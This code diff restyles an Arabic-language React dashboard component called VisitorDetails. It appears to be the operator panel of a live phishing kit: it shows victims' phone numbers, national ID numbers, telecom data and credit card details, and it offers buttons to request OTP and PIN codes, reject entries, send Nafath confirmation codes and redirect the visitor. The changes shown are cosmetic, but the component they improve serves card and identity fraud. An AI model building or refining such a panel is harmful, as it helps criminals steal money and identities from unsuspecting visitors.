@@ -37,9 +37,9 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
 
   if (!visitor) {
     return (
-      <div className="flex-1 flex items-center justify-center bg-gray-50">
-        <div className="text-center text-gray-500">
-          <p className="text-lg">اختر زائراً لعرض التفاصيل</p>
+      <div className="flex flex-1 items-center justify-center bg-slate-50/40">
+        <div className="rounded-2xl border border-dashed border-slate-300 bg-white/70 px-8 py-10 text-center shadow-sm">
+          <p className="text-lg font-semibold text-slate-600">اختر زائراً لعرض التفاصيل</p>
         </div>
       </div>
     );
@@ -465,12 +465,12 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
             value={nafadCode}
             onChange={(e) => setNafadCode(e.target.value)}
             placeholder="أدخل رقم التأكيد"
-            className="flex-1 px-3 py-2 border rounded-lg text-sm"
+            className="flex-1 rounded-lg border border-slate-300 bg-white px-3 py-2 text-sm focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-200"
           />
           <button
             onClick={handleSendNafadCode}
             disabled={!nafadCode.trim()}
-            className="px-4 py-2 bg-blue-600 text-white rounded-lg text-sm hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed"
+            className="rounded-lg bg-blue-600 px-4 py-2 text-sm font-medium text-white transition hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-50"
           >
             إرسال
           </button>
@@ -660,36 +660,35 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
   };
 
   return (
-    <div className="flex-1 flex flex-col bg-gray-50 overflow-hidden">
+    <div className="flex flex-1 flex-col overflow-hidden bg-transparent">
       {/* Header */}
-      <div className="bg-white border-b border-gray-200 p-4 md:p-6">
-        <div className="flex items-center justify-between">
+      <div className="border-b border-slate-200/80 bg-white/85 p-4 shadow-sm backdrop-blur md:p-6">
+        <div className="flex flex-wrap items-start justify-between gap-3">
           <div>
-            <h2 className="text-xl md:text-2xl font-bold text-gray-900">
+            <h2 className="text-xl font-extrabold text-slate-900 md:text-2xl">
               {visitor.ownerName || "زائر جديد"}
             </h2>
 
             {/* Contact Info */}
             <div className="flex flex-col gap-1 mt-2">
               <div className="flex items-center gap-4 text-sm">
-                <span className="text-gray-600">
+                <span className="rounded-lg bg-slate-100 px-2.5 py-1 text-slate-700">
                   📞{" "}
-                  <span className="font-semibold text-gray-800">
+                  <span className="font-semibold text-slate-900">
                     {visitor.phoneNumber || "غير محدد"}
                   </span>
                 </span>
-                <span className="text-gray-400">•</span>
-                <span className="text-gray-600">
+                <span className="rounded-lg bg-slate-100 px-2.5 py-1 text-slate-700">
                   🆔{" "}
-                  <span className="font-semibold text-gray-800">
+                  <span className="font-semibold text-slate-900">
                     {visitor.identityNumber || "غير محدد"}
                   </span>
                 </span>
               </div>
               {/* Display STC Data */}
               {visitor.stcPhone && (
-                <div className="bg-purple-50 border-l-4 border-purple-500 p-4 rounded-lg">
-                  <h4 className="font-semibold text-purple-900 mb-2">
+                <div className="rounded-xl border border-purple-200 bg-purple-50 p-4">
+                  <h4 className="mb-2 font-semibold text-purple-900">
                     بيانات STC
                   </h4>
                   <div className="space-y-2 text-sm">
@@ -701,7 +700,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
 
               {/* Device & Location Info */}
               {(visitor.country || visitor.browser || visitor.deviceType) && (
-                <div className="flex items-center gap-2 text-xs text-gray-500">
+                <div className="flex items-center gap-2 text-xs text-slate-500">
                   {visitor.country && <span>🌍 {visitor.country}</span>}
                   {visitor.browser && (
                     <>
@@ -734,7 +733,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
                 }
               }}
               disabled={isGeneratingPdf}
-              className="px-4 py-2 bg-red-600 text-white rounded-lg text-sm font-medium hover:bg-red-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors flex items-center gap-2"
+              className="inline-flex items-center gap-2 rounded-xl bg-slate-900 px-4 py-2 text-sm font-semibold text-white transition hover:bg-slate-800 disabled:cursor-not-allowed disabled:opacity-50"
             >
               {isGeneratingPdf ? (
                 <>
@@ -764,7 +763,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
             <select
               onChange={(e) => handleNavigate(e.target.value)}
               disabled={isNavigating}
-              className="px-4 py-2 border border-gray-300 rounded-lg bg-white text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 disabled:opacity-50"
+              className="rounded-xl border border-slate-300 bg-white px-4 py-2 text-sm text-slate-700 shadow-sm transition focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-200 disabled:opacity-50"
             >
               <option value="">توجيه الزائر...</option>
               <option value="home">الصفحة الرئيسية</option>
@@ -786,16 +785,16 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
       {/* Bubbles */}
       <div className="flex-1 overflow-y-auto p-3 md:p-6">
         {sortedBubbles.length === 0 ? (
-          <div className="text-center text-gray-500 py-12">
+          <div className="py-12 text-center text-slate-500">
             <p>لا توجد بيانات لعرضها</p>
           </div>
         ) : (
           <div
-            className="grid grid-cols-1 lg:grid-cols-3 gap-6 lg:gap-0"
+            className="grid grid-cols-1 gap-6 lg:grid-cols-3 lg:gap-0"
             dir="rtl"
           >
             {/* Right Column - Credit Card and Card Details */}
-            <div className="flex flex-col gap-4 lg:border-l lg:border-gray-200 lg:pl-6">
+            <div className="flex flex-col gap-4 lg:border-l lg:border-slate-200 lg:pl-6">
               {sortedBubbles
                 .filter(
                   (b) => b.id.startsWith("card-info") || b.id === "card-details"
@@ -822,7 +821,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
                                   handleBubbleAction(bubble.id, "otp")
                                 }
                                 disabled={isProcessing}
-                                className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-blue-600 text-white rounded-lg text-xs md:text-sm hover:bg-blue-700 disabled:opacity-50 font-medium"
+                                className="flex-1 rounded-lg bg-blue-600 px-2 py-1.5 text-xs font-medium text-white transition hover:bg-blue-700 disabled:opacity-50 md:px-4 md:py-2 md:text-sm"
                               >
                                 🔑 رمز OTP
                               </button>
@@ -831,7 +830,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
                                   handleBubbleAction(bubble.id, "pin")
                                 }
                                 disabled={isProcessing}
-                                className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-purple-600 text-white rounded-lg text-xs md:text-sm hover:bg-purple-700 disabled:opacity-50 font-medium"
+                                className="flex-1 rounded-lg bg-purple-600 px-2 py-1.5 text-xs font-medium text-white transition hover:bg-purple-700 disabled:opacity-50 md:px-4 md:py-2 md:text-sm"
                               >
                                 🔐 كود PIN
                               </button>
@@ -840,7 +839,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
                                   handleBubbleAction(bubble.id, "reject")
                                 }
                                 disabled={isProcessing}
-                                className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-red-600 text-white rounded-lg text-xs md:text-sm hover:bg-red-700 disabled:opacity-50 font-medium"
+                                className="flex-1 rounded-lg bg-red-600 px-2 py-1.5 text-xs font-medium text-white transition hover:bg-red-700 disabled:opacity-50 md:px-4 md:py-2 md:text-sm"
                               >
                                 ❌ رفض
                               </button>
@@ -907,7 +906,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
             </div>
 
             {/* Middle Column - Dynamic Cards (OTP, PIN, Phone, etc.) */}
-            <div className="flex flex-col gap-4 lg:border-l lg:border-gray-200 lg:px-6">
+            <div className="flex flex-col gap-4 lg:border-l lg:border-slate-200 lg:px-6">
               {sortedBubbles
                 .filter(
                   (b) =>
